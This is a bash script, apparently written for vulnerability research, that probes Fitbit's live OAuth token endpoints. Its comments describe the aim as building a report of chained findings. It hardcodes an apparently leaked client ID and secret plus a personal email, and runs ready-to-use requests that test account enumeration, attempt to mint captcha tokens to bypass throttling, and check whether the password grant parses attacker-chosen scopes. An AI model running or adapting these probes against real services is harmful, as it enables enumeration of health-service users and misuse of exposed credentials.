#!/data/data/com.termux/files/usr/bin/bash
# g-chain.sh — three extensions to the chain, all terminal-only, none brute force.
set -u
ID=228TQD; SEC=7659f9d9ecc92d6dc1ee0d1774e9744a
B=$(printf '%s:%s' "$ID" "$SEC" | base64 -w0 2>/dev/null || printf '%s:%s' "$ID" "$SEC" | base64)
OWN="${1:-kaseym484@gmail.com}"

post() { printf '  %-46s ' "$1"; shift
  curl -s --max-time 14 -X POST "$1" -H "Authorization: Basic $B" \
    -H 'Content-Type: application/x-www-form-urlencoded' -d "$2" \
    -w ' [%{http_code}]\n' 2>/dev/null | tr -d '\n' | head -c 300; echo; sleep 2; }

echo "######################################################################"
echo "# 1. USER ENUMERATION — does the response distinguish real accounts?  #"
echo "######################################################################"
cat <<'TXT'
  Two requests, both with a wrong password. One names an account that EXISTS
  (ours), one names an address that cannot exist. If the two answers differ, the
  endpoint tells an unauthenticated caller which email addresses have Fitbit
  accounts — and the captcha that would normally throttle that is not required.
  Fitbit accounts are health accounts, so an account-existence oracle is a real
  privacy exposure, not just noise.
TXT
echo
post "[EXISTS]   our own account, wrong password" "https://api.fitbit.com/oauth2/token" \
  "grant_type=password&username=$OWN&password=zzz-deliberately-wrong-7x2"
post "[ABSENT]   address that cannot exist" "https://api.fitbit.com/oauth2/token" \
  "grant_type=password&username=zzz-no-such-user-7x2@example.com&password=zzz-deliberately-wrong-7x2"
echo "  Same wording -> no oracle, drop it. Different wording -> enumeration, and"
echo "  it inherits the missing captcha from the main finding."

echo
echo "######################################################################"
echo "# 2. Can we MINT a captcha token ourselves? oauth2/recaptcha_token    #"
echo "######################################################################"
cat <<'TXT'
  Their bundle names RECAPTCHA_TOKEN: "oauth2/recaptcha_token". If the published
  secret can mint whatever that endpoint issues, the bypass stops being "the
  endpoint forgot to require a captcha" and becomes "the attacker can satisfy the
  captcha requirement at will" - which survives even if Fitbit starts enforcing it.
TXT
echo
post "recaptcha_token, empty body" "https://api.fitbit.com/oauth2/recaptcha_token" ""
post "recaptcha_token, with an action" "https://api.fitbit.com/oauth2/recaptcha_token" \
  "recaptchaAction=LOGIN&grant_type=password"
printf '  %-46s ' "[SENTINEL] endpoint that cannot exist"
curl -s --max-time 12 -X POST "https://api.fitbit.com/oauth2/zzz_not_an_endpoint_7x2" \
  -H "Authorization: Basic $B" -H 'Content-Type: application/x-www-form-urlencoded' -d '' \
  -w ' [%{http_code}]\n' | tr -d '\n' | head -c 200; echo

echo
echo "######################################################################"
echo "# 3. Does the password grant honour a SCOPE parameter?                #"
echo "######################################################################"
cat <<'TXT'
  Their code does:  if (!isEmpty(scopes)) f.scope = joined
  So the password grant takes a scope. A wrong password cannot return a token, so
  this cannot be settled here - but if the ERROR differs when an impossible scope
  is requested, the parameter is being parsed and validated before the credential
  check, which tells us the scope is attacker-controlled on this path.
TXT
echo
post "no scope" "https://api.fitbit.com/oauth2/token" \
  "grant_type=password&username=$OWN&password=zzz-wrong-7x2"
post "scope=heartrate location sleep" "https://api.fitbit.com/oauth2/token" \
  "grant_type=password&username=$OWN&password=zzz-wrong-7x2&scope=heartrate%20location%20sleep"
post "scope=zzz_not_a_real_scope_7x2" "https://api.fitbit.com/oauth2/token" \
  "grant_type=password&username=$OWN&password=zzz-wrong-7x2&scope=zzz_not_a_real_scope_7x2"
echo
echo "  All three identical -> scope is not validated before credentials. Inconclusive,"
echo "  and it stays out of the report. The impossible-scope row differing -> the scope"
echo "  IS parsed first, and a successful login would carry whatever scope was asked for."
